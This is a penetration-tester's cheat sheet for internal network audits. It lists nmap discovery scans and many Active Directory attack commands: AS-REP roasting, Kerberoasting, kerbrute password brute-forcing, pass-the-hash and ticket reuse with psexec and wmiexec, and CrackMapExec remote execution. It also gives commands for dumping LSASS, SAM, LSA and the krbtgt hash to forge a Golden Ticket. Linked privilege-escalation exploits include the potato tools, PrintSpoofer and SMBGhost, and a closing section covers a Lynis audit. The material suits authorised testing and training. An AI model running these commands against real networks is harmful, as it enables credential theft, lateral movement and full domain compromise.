# Internal Audit - Plan

{% embed url="https://pentestbook.six2dez.com/others/internal-pentest" %}

{% file src="../../.gitbook/assets/Pentest_Active_Directory_Environment_1666475020.pdf" %}

## Network discovery

### Scanning

```bash
# BEST - https://miloserdov.org/?p=5248
# discover
sudo nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml $network_ip
# extract the hosts
grep -A 2 'up' nmap_output.xml | grep -E -o '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' > hosts.txt
# scan them, find routers
sudo nmap -v -PE -n --min-hostgroup 1024 --min-parallelism 1024 -p 80,443,8080,1080 --open -iL hosts.txt -oX nmap_routers.xml

# OTHERS
# Ping discovery, Top 20, fragment packets, no DNS resolution
nmap -v --top-ports 20 $ip/24 -f -n --open -oA
# Ping discovery, Top 200, fragment packets, no DNS resolution, service version
nmap -v --top-ports 200 $ip/24 -f -n -sV --open -oA
# Top 1000, fragment packets, no DNS resolution, service version, all alive (no ping)
nmap -v --top-ports 1000 $ip/24 -f -n -sV -Pn --open -oA
```

## Windows AD

{% embed url="https://wadcoms.github.io" %}
Check this
{% endembed %}

### If you have no credentials

```bash
# get basic infos
cme smb $ip

# Detect SMB on network
responder-RunFinger -i X.X.X.0/24

# Find DC
nslookup -q=srv _ldap._tcp.dc._msdcs.<domain.name>
nslookup -type=srv _ldap._tcp.<domain.name> | grep ldap | cut -d ' ' -f 6 | sed 's/\.$//g'

# Enumerate DC
ldapsearch -h <DC.IP> -x -s base namingcontexts

# Check for null session, if got users go for ASREPRoast with GetNPUsers
ldapsearch -h <DC.IP> -x -b "DC=XX,DC=XX"

# Get hashes with no krb preauth
GetNPUsers.py [Domain Name]/ -dc-ip [Domain Controller IP address] -request
GetNPUsers.py 'DC.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.10

# Get domain name
crackmapexec smb 10.10.10.10
smbmap -H $dc_ip -u '' -p ''

# Get Users List
GetADUsers.py DC.local/ -dc-ip $dc_ip -debug

# Get Users from ldap
windapsearch -U — full — dc-ip $dc_ip

# Get base domain
ldapsearch -x -h $dc_ip -s base namingcontexts

# Get more info from DC
ldapsearch -x -h $dc_ip -b ‘DC=DCNAME,DC=LOCAL’

# User Domain info
Get-ADUser $name

# Forest info
Get-ADForest

# Get all computers in the current domain
Get-NetComputer
```

#### Kerberos

```bash
# Kerberoasting (hashcat 13100)
GetUserSPNs.py -request -save -dc-ip <IP> domain/user # hashcat 13100

# Bruteforce usernames and passwords with kerbrute
kerbrute.py -d <DC.LOCAL> -users <users_file> -passwords <passwords_file> -outputfile <output_file>

# ASREPRoast (hashcat 18200)
GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# PTH/PTK
# Request ticket
getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
getTGT.py <domain_name>/<user_name>:[password]
# Set ticket
export KRB5CCNAME=<TGT_ccache_file>
# Use it
psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
psexec.py -hashes 'hash' -dc-ip 10.10.10.10 username@10.10.10.10
smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

### If you have credentials

```bash
# Enum AD AIO
# https://github.com/CasperGN/ActiveDirectoryEnumeration
python3 -m ade --dc <domain.name> -u <user@domain.name> --help
# https://github.com/adrecon/ADRecon from Windows on Domain

# windapsearch
# https://github.com/ropnop/go-windapsearch
windapsearch -d <domain>.<name> -u <user> -p <password> --help

# LDAP
# best tool : ldeep - https://github.com/franc-pentest/ldeep
ldeep ldap -u <USER> -p <PASSWORD> -d <DOMAIN> -s ldap://<DC_IP_OR_LDAP_SERV> all ldap_dump_

# Domain users
ldapsearch -LLL -x -H ldap://<DC.IP> -D "<USER>@<DOMAIN.NAME>" -w '<PASSWORD>' -b dc=<DOMAIN NAME>,dc=<DOMAIN NAME> -o ldif-wrap=no "(&(objectClass=user)(objectCategory=person))" name sAMAccountName userPrincipalName memberOf primaryGroupID adminCount userAccountControl description servicePrincipalName objectSid pwdLastSet lastLogon -E pr=1000/noprompt | tee domain_users.txt

# Domain computers
ldapsearch -LLL -x -H ldap://<DC.IP> -D "<USER>@<DOMAIN.NAME>" -w '<PASSWORD>' -b dc=<DOMAIN NAME>,dc=<DOMAIN NAME> -o ldif-wrap=no "(objectClass=computer)" name dNSHostname memberOf operatingSystem operatingSystemVersion lastLogonTimestamp servicePrincipalName description userAccountControl | tee domain_computers.txt

# Domain groups
ldapsearch -LLL -x -H ldap://<DC.IP> -D "<USER>@<DOMAIN.NAME>" -w '<PASSWORD>' -b dc=<DOMAIN NAME>,dc=<DOMAIN NAME> -o ldif-wrap=no "(objectClass=group)" name sAMAccountName memberOf member description objectSid | tee domain_groups.txt

# RPClient - enumeration users, groups, ...
rpcclient -U "DOMAIN/username%password" <domaincontroller name or IP>" -c dsr_enumtrustdom
rpcclient -U "DOMAIN/username%password" <domaincontroller name or IP>" -c enumdomains
rpcclient -U "DOMAIN/username%password" <domaincontroller name or IP>" -c enumdomusers
rpcclient -U "DOMAIN/username%password" <domaincontroller name or IP>" -c enumdomgroups

# CME
# Run commands

# PS
cme smb <IP> -u <USER> -p '<PASS>' -X 'Get-Host'
# CMD
cme smb <IP> -u <USER> -p '<PASS>' -x whoami
# PTH
cme smb <IP> -u <USER> -H <NTHASH> -x whoami
# Other methods
cme smb <IP> -u <USER> -p '<PASS>' --exec-method {mmcexec,smbexec,atexec,wmiexec}

# Dumps
# LSASSY
cme smb <IP> -d <DOMAIN> -u <USER> -p <PASS> -M lsassy
# SAM
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --sam
# LSA
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --lsa
# Sessions
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --sessions
# Logged users
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --loggedon-users
# Disks
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --disks
# Users
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --users #Enumerate users
# Groups
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --groups
# Local groups
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --local-groups
# Password policy
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --pass-pol
```

#### Dumps secrets

```bash
# User hash
secretsdump.py '<DC.NAME>/<User>@<DC.IP>' -just-dc-user user1

# krbtgt hash dump -> Golden Ticket
secretsdump.py '<DC.NAME>/<User>@<DC.IP>' -just-dc-user krbtgt
```

### Local Privilege Escalation

#### Juicy Potato

{% hint style="info" %}
**Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation**

Works only until Windows Server 2016 and Windows 10 until patch 1803.
{% endhint %}

{% embed url="https://github.com/ohpe/juicy-potato" %}

{% embed url="https://github.com/TsukiCTF/Lovely-Potato" %}

#### PrintSpoofer

{% hint style="info" %}
**Exploit the PrinterBug for System Impersonation**

Works for Windows Server 2019 and Windows 10.
{% endhint %}

{% embed url="https://github.com/itm4n/PrintSpoofer" %}

#### RoguePotato

{% hint style="info" %}
**From Service Account to System**

Works for Windows Server 2019 and Windows 10.
{% endhint %}

{% embed url="https://github.com/antonioCoco/RoguePotato" %}

#### Abusing Token Privileges

{% embed url="https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation" %}

#### SMBGhost CVE-2020–0796

{% embed url="https://github.com/danigargu/CVE-2020-0796" %}

#### CVE-2021–36934 (HiveNightmare/SeriousSAM)

{% embed url="https://github.com/cube0x0/CVE-2021-36934" %}

## Linux

### Lynis

{% hint style="info" %}
Lynis is a **battle-tested security tool** for systems running Linux, macOS, or Unix-based operating system. It performs an extensive health scan of your systems to support system hardening and compliance testing.
{% endhint %}

In order to install **Lynis** on your system, you must follow these steps :

```bash
git clone https://github.com/CISOfy/lynis.git
cd lynis
./lynis audit system -Q
```
